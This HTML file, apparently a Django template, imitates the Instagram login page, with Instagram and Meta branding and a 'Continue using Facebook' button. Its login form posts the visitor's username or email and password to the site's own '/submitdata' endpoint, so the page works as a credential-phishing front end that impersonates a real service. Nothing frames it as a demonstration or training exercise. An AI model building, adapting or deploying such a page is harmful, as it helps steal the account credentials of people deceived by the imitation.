<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/fontawesome.min.css"
      integrity="sha384-QYIZto+st3yW+o8+5OHfT6S482Zsvz2WfOzpFSXMF9zqeLcFV0/wlZpMtyFcZALm"
      crossorigin="anonymous"
    />
    <!-- Bootstrap CSS -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
      crossorigin="anonymous"
    />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,800;1,100&display=swap"
      rel="stylesheet"
    />
    <style>
      

.a {
  justify-content: center;
  align-items: center;
  text-align: center;
  margin-top: 10px;
}
#a {
  font-family: "Poppins", sans-serif;
}
#btn {
  color: white;
  background-color: rgb(13, 45, 116);
  border-radius: 10px;
  border: 2px solid rgb(11, 39, 128);
  height: 5vh;
  width: 60vw;
}

@media  screen and (max-width: 370px) {
    #btn{
      color: white;
    background-color: rgb(13, 45, 116);
    border-radius: 10px;
    border: 2px solid rgb(11, 39, 128);
    height: 6vh;
    width: 60vw;
    font-size: 13px;
  
    }
    
  }
#input1 {
  height: 5vh;
  width: 60vw;
}
#input2 {
  height: 5vh;
  width: 60vw;
}
#p {
  color: rgb(12, 72, 201);
}
#anc {
  text-decoration: none;
}

    </style>


  </head>
  <body>
    <section class="container">
      <div class="row">
        <div class="col-md a">
          <h6 id="a">
            English(UK)
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="20"
              height="20"
              fill="currentColor"
              class="bi bi-caret-down"
              viewBox="0 0 16 16"
            >
              <path
                d="M3.204 5h9.592L8 10.481 3.204 5zm-.753.659 4.796 5.48a1 1 0 0 0 1.506 0l4.796-5.48c.566-.647.106-1.659-.753-1.659H3.204a1 1 0 0 0-.753 1.659z"
              />
            </svg>
          </h6>
          <br />
          <br />
          <h1 id="a">Instagram</h1>
          <br />
          <br />
          <br />
          <button id="btn">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="20"
              height="20"
              fill="currentColor"
              class="bi bi-facebook"
              viewBox="0 0 16 16"
            >
              <path
                d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"
              />
            </svg>
            Continue using Facebook
          </button>
          <br />
          <br />
          <h6>OR</h6>
          <br />
          <br />
          <form action="/submitdata" method="post">
            {% csrf_token %}

          <input
            id="input1"
            name="name"
            type="text"
            placeholder="Phone number,username, or email"
          />
          <br />
          <br />
          <p id="p1"></p>

          <input id="input2" type="password" name="password" placeholder="password" /> <br />
          <br />
          <p id="p2"></p>

          <p id="p">
            &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Forgetten your password ?
          </p>
          <br />
          <button style="cursor: pointer;" id="btn" onclick=" return myfun()">Log in</button>
        </form>
          <br />
          <br />
          <h6>Don't have an account?<a id="anc" href="">Sign up</a></h6>
          <br />

          <h6>from</h6>
          <p style="color: rgb(206, 14, 78)">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              fill="currentColor"
              class="bi bi-infinity"
              viewBox="0 0 16 16"
            >
              <path
                d="M5.68 5.792 7.345 7.75 5.681 9.708a2.75 2.75 0 1 1 0-3.916ZM8 6.978 6.416 5.113l-.014-.015a3.75 3.75 0 1 0 0 5.304l.014-.015L8 8.522l1.584 1.865.014.015a3.75 3.75 0 1 0 0-5.304l-.014.015L8 6.978Zm.656.772 1.663-1.958a2.75 2.75 0 1 1 0 3.916L8.656 7.75Z"
              />
            </svg>
            Meta
          </p>
        </div>
      </div>
    </section>

    <!-- JS PORTION -->
    <script>
      function myfun() {
        var a = document.getElementById("input1").value;
        var b = document.getElementById("input2").value;
        if (a.length == " " || a.length == null) {
          document.getElementById("p1").innerHTML = "enter  your details";
          return false;
        }else{
            document.getElementById("p1").innerHTML = " ";

        }
        if (b.length == " " || b.length == null) {
          document.getElementById("p2").innerHTML = "enter your password";
          return false;
        }else{
            document.getElementById("p2").innerHTML = " ";

        }
       
      }
    </script>

    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
